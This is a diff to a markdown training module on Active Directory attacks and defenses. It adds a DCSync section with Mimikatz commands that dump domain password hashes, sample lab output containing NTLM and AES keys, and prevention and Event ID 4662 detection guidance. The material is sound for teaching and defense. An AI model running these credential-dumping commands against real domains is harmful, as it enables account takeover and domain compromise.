@@ -39,8 +39,9 @@ This module covers **Active Directory attacks and defense** - common attack tech
 6. [GPO Permissions / GPO Files](#6-gpo-permissions--gpo-files)
 7. [Credentials in Shares](#7-credentials-in-shares)
 8. [Credentials in Object Properties](#8-credentials-in-object-properties)
-9. [Interview Questions](#9-interview-questions)
-10. [Additional Resources](#10-additional-resources)
+9. [DCSync](#9-dcsync)
+10. [Interview Questions](#10-interview-questions)
+11. [Additional Resources](#11-additional-resources)
 
 ---
 
@@ -1160,7 +1161,119 @@ PasswordLastSet      : 05/12/2022 15.18.05
 
 ---
 
-## 9. Interview Questions
+## 9. DCSync
+
+### Description
+
+> 📌 **DCSync** - impersonates a Domain Controller to replicate password hashes from Active Directory.
+
+```mermaid
+graph LR
+    Attacker[Attacker] -->|Has Replicating<br/>Directory Changes| User[User Account]
+    User -->|DCSync<br/>Request| DC[Domain Controller]
+    DC -->|Returns<br/>Password Hashes| User
+    User -->|Extracts| Hashes[NTLM Hashes]
+    
+    style Attacker fill:#ff9999,stroke:#333
+    style DC fill:#ffe5cc,stroke:#333
+    style Hashes fill:#ffcccc,stroke:#333
+```
+
+**Required Permissions:**
+- Replicating Directory Changes
+- Replicating Directory Changes All
+
+### Attack
+
+**Step 1: Get shell as user with replication permissions:**
+
+```cmd
+runas /user:eagle\rocky cmd.exe
+```
+
+**Output:**
+
+<img width="582" height="195" alt="image" src="https://github.com/user-attachments/assets/77be8832-5749-405d-9f61-93c7d1b24675" />
+
+**User permissions check:**
+
+<img width="479" height="561" alt="image" src="https://github.com/user-attachments/assets/9caa93b8-e60c-4aff-98b6-0178eff3951c" />
+
+**Step 2: Run Mimikatz to DCSync:**
+
+```cmd
+mimikatz.exe
+
+lsadump::dcsync /domain:eagle.local /user:Administrator
+```
+
+**Output:**
+
+```
+[DC] 'eagle.local' will be the domain
+[DC] 'DC2.eagle.local' will be the DC server
+[DC] 'Administrator' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Password last change : 07/08/2022 11.24.13
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: fcdc65703dd2b0bd789977f1f3eeaecf
+
+Supplemental Credentials:
+* Primary:Kerberos-Newer-Keys *
+    aes256_hmac       (4096) : 1c4197df604e4da0ac46164b30e431405d23128fb37514595555cca76583cfd3
+    aes128_hmac       (4096) : 4667ae9266d48c01956ab9c869e4370f
+    des_cbc_md5       (4096) : d9b53b1f6d7c45a8
+```
+
+<img width="671" height="425" alt="image" src="https://github.com/user-attachments/assets/9700a4dc-8592-4f04-9b97-9c6fdde47cca" />
+
+> 💡 Use `/all` parameter to dump all AD hashes
+
+### Prevention
+
+| Mitigation | Description |
+|-----------|-------------|
+| **RPC Firewall** | Third-party product to block/allow specific RPC calls |
+| **Restrict Permissions** | Only Domain Controllers should replicate |
+| **Monitor AD Admins** | Limit who has replication permissions |
+
+> 🔴 DCSync abuse normal AD replication - hard to prevent!
+
+### Detection
+
+> 📌 **Event ID 4662** - Directory object accessed
+
+**Detection:**
+- Monitor Event ID 4662 with specific properties
+- Alert when non-DC accounts perform replication
+
+**Properties to monitor:**
+- `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (Replicating Directory Changes)
+- `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (Replicating Directory Changes All)
+
+**Event 4662 Example:**
+
+<img width="1034" height="1093" alt="image" src="https://github.com/user-attachments/assets/ed51307d-c3b5-4c76-80ab-84d8b39b7768" />
+
+**False Positive Handling:**
+- Whitelist Domain Controllers
+- Whitelist Azure AD Connect (constantly replicates)
+- Business justification required for other accounts
+
+---
+
+## 10. Interview Questions
 
 ### Q1: What is Kerberoasting and how does it work?
 
@@ -1338,7 +1451,7 @@ Get-WinEvent -FilterHashtable @{LogName='Security';ID=4769} |
 
 ---
 
-## 10. Additional Resources
+## 11. Additional Resources
 
 ### Tools
 
